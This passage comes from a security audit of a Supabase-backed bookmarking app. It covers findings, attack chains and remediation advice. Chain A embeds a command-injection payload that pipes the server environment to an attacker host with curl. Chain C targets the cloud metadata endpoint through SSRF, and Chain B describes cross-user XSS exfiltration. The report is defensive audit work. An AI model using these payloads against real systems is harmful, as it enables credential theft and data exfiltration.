`c.name.startsWith("sb-") && c.name.includes("-auth-token")` misses Supabase's newer split‑token cookies if the project ever adopts them (e.g., `sb-…-auth-token.0`). It does match `.0`/`.1` because `includes("-auth-token")` still fires. Fine for now; brittle to future Supabase changes.

---

### INFO‑1. Dev/test scripts hold service‑role key

Scripts (`scripts/import-*.ts`, `scripts/test-*.ts`) read `SUPABASE_SERVICE_ROLE_KEY` from `.env.local`. Not deployable to prod, but the key must be developer‑local only. Ensure `.env.local` is not shipped in Docker images, Vercel envs, or shared over 1Password without expiry.

---

### INFO‑2. No CSRF token

Mitigated by Supabase's SameSite=Lax cookies and by requiring `Content-Type: application/json` (browsers force a preflight, and CORS is `*` without credentials → cookies not sent). Still worth adding a `SameSite=Strict` + double‑submit token for any high‑value operation (`/api/auth/delete-account`).

---

### INFO‑3. Un‑versioned SQL migrations

Migrations sit as loose `.sql` files at repo root; there is no ordering or rollback record. Drift risk between environments.

---

### INFO‑4. Hard‑coded fallback `NEXT_PUBLIC_APP_URL`

`https://marks-drab.vercel.app` is baked in. If DNS or the Vercel project is ever recycled, this becomes an attacker‑controllable destination for the auto‑archive callback (MED‑4).

---

## 4. Attack Chains

### Chain A — Signup → RCE → total DB compromise
1. Attacker signs up (self‑serve, 6‑char password OK) — **no exploit yet**.
2. `POST /api/bookmarks` with a `x.com/…/status/…$(curl attacker/$(env|base64 -w0))` URL and a tweet‑shaped title. **CRIT‑1** fires either during POST or on the first `/reader/[id]` render.
3. Shell exfiltrates `SUPABASE_SERVICE_ROLE_KEY`.
4. Attacker uses the service‑role key against Supabase REST → dumps `bookmarks`, `archived_content`, `kindle_data`, `user_storage`, `auth.users` (emails).
5. Optional: overwrite any user's bookmark to insert stored XSS (**HIGH‑2**) → session takeover of victims that visit their reader, which even after key rotation lets attacker regain footholds.

### Chain B — Malicious webpage → cross‑user XSS → account‑wide takeover
1. Attacker publishes a page with an XSS `<title>` (HIGH‑1) and a Readability‑survivable `<img onerror>` in the body (HIGH‑2).
2. Victim (unaware) bookmarks the page (via extension or bookmarklet).
3. Auto‑archive runs; the title lands in `bookmarks.title`, the body in `archived_content.content_html`.
4. Victim later searches or opens the reader → XSS in `getmarks.sh` origin.
5. Payload calls `/api/bookmarks` (GET all) → exfiltrates the victim's saved URLs & notes; posts a new bookmark whose `type_metadata.content_html` is a rootkit‑style hook page; optionally calls `/api/auth/delete-account`.

### Chain C — SSRF → cloud creds → RCE‑equivalent
1. `POST /api/bookmarks` with `url: "http://169.254.169.254/latest/meta-data/iam/…"` (**CRIT‑2**).
2. Auto‑archive persists the IMDS response into `archived_content`.
3. Attacker reads it back via `/reader/[id]`.
4. If Vercel runtime is on AWS with instance profile access, creds land in the attacker's hands.

### Chain D — Storage tenant break
1. Enumerate victim `user_id` via `/api/site-stats` misuse or via extension‑generated storage paths in error messages.
2. `POST /api/upload-pdf` with `storagePath = "<victimUUID>/<bookmarkId>/document.pdf"` (**CRIT‑3‑A**).
3. `stored_media` row for attacker now references victim's file.
4. `GET /api/pdf/<attacker_bookmark_id>` calls `getSignedUrl(path)` on the victim's path → signed URL returned → attacker downloads the victim's PDF.
5. If bucket RLS was misconfigured, step 4 works today.

---

## 5. Secure Design Recommendations

1. **Ban shelling out for HTTP.** Replace `execSync("curl …")` with `fetch()` / `undici`. Lint rule: forbid `child_process` in `lib/` and `app/`.
2. **Central egress guard.** One helper (`safeFetch(url, opts)`) that scheme‑checks, DNS‑resolves + IP‑range‑filters, caps size, and manually validates redirects. Every outbound HTTP call routes through it.
3. **Central sanitizer for stored HTML.** All `content_html`, tweet HTML, and `type_metadata.content_html` runs through DOMPurify/`sanitize-html` with a fixed policy on both write and read. Store the **plain text** version as the DB truth and reserve HTML for rendering.
4. **Never store admin credentials in public code paths.** Move `createAdminClient` behind a `lib/admin.ts` that throws unless the request comes from a signed background job (cron) or an admin session.
5. **Column allow‑lists at the DB layer.** `updateBookmark(id, fields)` should destructure only expected keys — no `...fields` spread.
6. **Server‑authoritative sizes and paths.** Ignore client `fileSize`; enforce `storagePath` prefix per user; clamp storage delta to non‑negative in SQL.
7. **CSP + baseline headers.** Enable a strict CSP (`script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'none'`) plus `X-Frame-Options`, `Referrer-Policy: no-referrer`, `Permissions-Policy` denying camera/mic/geo, and lock CORS to a known origin list.
8. **Bounded AI/egress budgets.** Per‑user quota on Anthropic calls, on outbound `fetch` count per hour, and on archive attempts per bookmark.
9. **Rate limiting layer.** Upstash‑backed sliding‑window on `signup`, `login`, `bookmarks POST`, `archive POST`, `enrich POST`, `metadata GET`, `suggest-tags GET`.
10. **RLS auditing.** Explicit test suite that, for every table, asserts:
    - A user cannot `select`/`insert`/`update`/`delete` another user's rows.
    - The Supabase Storage `user-files` bucket policy enforces the same per‑`auth.uid()` prefix rule.
11. **Replace `ts_headline`‑to‑HTML** with a structured `[text, highlights[]]` response and client‑side React rendering that never uses `dangerouslySetInnerHTML`.
12. **Password + MFA.** Raise min length to 12 and enable Supabase MFA (TOTP) — worth it for a personal knowledge base.
13. **Structured errors.** Log a request‑id server‑side; return `{ error: "internal", request_id: … }` — never the raw Postgres message.
14. **Migration versioning.** Adopt supabase CLI migrations with a `schema_migrations` history table.
15. **Kill the internal HTTP callback.** Do the archive work inline or on a queue — do not `fetch(NEXT_PUBLIC_APP_URL/api/…)`.

---

## Appendix — Files touched during audit

- `middleware.ts`, `next.config.ts`, `package.json`
- `lib/auth.ts`, `lib/db.ts`, `lib/supabase-server.ts`, `lib/supabase.ts`, `lib/supabase-browser.ts`, `lib/extract.ts`, `lib/ai.ts`, `lib/storage.ts`, `lib/pdf-html.ts`, `lib/twitter.ts`, `lib/youtube.ts`, `lib/suggest-tags.ts`, `lib/detect-type.ts`
- All routes under `app/api/**`
- `app/reader/[id]/page.tsx` + child components, `app/search-bar.tsx`, `app/library.tsx`, `app/bookmark-item.tsx`, `app/add/page.tsx`, `app/settings/page.tsx`, `app/actions/**`, `app/kindle/page.tsx`, `app/read/page.tsx`, `app/stats/page.tsx`, `app/private/page.tsx`, `app/layout.tsx`
- `supabase-schema.sql` and all `supabase-migration-*.sql` files

Not exhaustively reviewed: `ios/**`, `chrome-extension/`, `extension/`. Any additional client that speaks to `/api/*` inherits every backend finding above.
